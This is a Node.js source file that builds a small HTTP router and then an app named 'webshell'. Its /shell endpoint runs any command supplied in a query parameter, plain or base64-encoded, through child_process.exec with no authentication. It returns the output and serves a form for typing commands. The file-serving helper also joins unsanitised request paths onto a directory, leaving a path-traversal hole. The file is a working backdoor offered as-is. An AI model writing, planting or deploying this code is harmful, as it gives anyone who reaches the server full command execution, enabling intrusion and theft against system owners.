//-----------------------------router---------------------------------
const qs = require('querystring');
const url = require('url');
const fs = require('fs');


function core(applicationName){
  this.name = applicationName
  this.routeRequest = [];
  this.middlewareRequest = [];
  this.publicPath = null;
}

core.prototype.route = function(req, res){
  var _this = this;
  var q = url.parse(req.url, true);
  req.query = q.query;
  req.pathname = q.pathname;

  var body = '';
  req.on('data', function (data) {
    body += data;
    if(body.length>1e6)
      req.connection.destroy();
  });

  req.on('end', function(){
    req.post = qs.parse(body);
    _this.middleware(req, res);
  });
}

core.prototype.middleware = function(req, res, index = 0){
  if(index<this.middlewareRequest.length){
    var _this = this;
    return this.middlewareRequest[index](req, res, ()=>{
      return _this.middleware(req, res, index+1);
    });
  }else{
    return this.request(req, res, this);
  }
}

core.prototype.set = function(func){
  this.middlewareRequest.push(func);
}

core.prototype.use = function(path, func){
  this.routeRequest[path.toLowerCase()] = func
}

core.prototype.setPublic = function(path){
  this.publicPath = (path);
}

core.prototype.request = (req, res, _this) => {
  var routeFunc = _this.routeRequest[req.pathname.toLowerCase()];
  if(routeFunc===undefined&&_this.publicPath===null){
    //return res.end('404 not found');
  }else if(routeFunc!==undefined){
    return routeFunc(req, res);
  }else if(_this.publicPath.length){
    return _this.readFromPublic(req, res);
  }
}

core.prototype.readFromPublic = function(req, res){
  var target = this.publicPath+req.pathname;
  fs.readFile(target, function (err, buffer) {
    if(err){
      res.end("404 not found");
    }else{
      res.end(buffer);
    }
  });
}

//-----------------------------router--------------------------------
const http = require('http');
const shell = require('child_process');

var app = new core('webshell');

//app.setPublic(__dirname+'/public');

app.set((req, res, next)=>{
  console.log(req.method, req.url);
  next();
});

app.use('/shell', (req, res)=>{
  if(req.query.shell!=undefined||req.query.b64!=undefined){
    req.query.b64 = req.query.b64||'cHdkJiZscw==';
    let b64 = Buffer.from(req.query.b64||'', 'base64').toString('ascii')
    shell.exec(req.query.shell||b64,function(error,stdout,stderr){
      res.end(stdout);
    });
  }else{
    res.end(`<script>
  function tob64(){
    document.querySelector('[name="b64"]').value = window.btoa(document.querySelector('[name="b64"]').value);
    return true;
  }
  function deb64(){
    document.querySelector('[name="b64"]').value = window.atob(document.querySelector('[name="b64"]').value);
  }
</script>
<form>
  <input name="shell" placeholder="shell"/>
  <input type="submit"/>
</form>
<br>
<form onsubmit="return tob64();">
  <input name="b64" placeholder="base64 shell">
  <input type="submit">
</form>
<input type="button" onclick="deb64()" value="decode base64"/>`);
  }
});

http.createServer((req, res)=>app.route(req, res)).listen(process.argv[2]||3000);
